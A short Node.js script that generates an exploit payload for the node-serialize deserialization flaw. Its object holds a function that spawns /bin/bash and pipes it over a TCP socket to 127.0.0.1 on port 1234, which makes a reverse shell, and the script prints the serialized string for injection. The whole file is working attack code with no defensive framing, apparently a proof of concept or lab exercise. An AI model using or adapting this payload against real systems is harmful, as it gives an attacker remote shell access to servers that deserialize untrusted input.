var serialize = require('node-serialize');

var x = {
  rce: function() {var net = require("net"), sh = require("child_process").exec("/bin/bash");var client = new net.Socket();client.connect(1234, "127.0.0.1", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});}
}
console.log("reverse shell serialized: " + serialize.serialize(x));
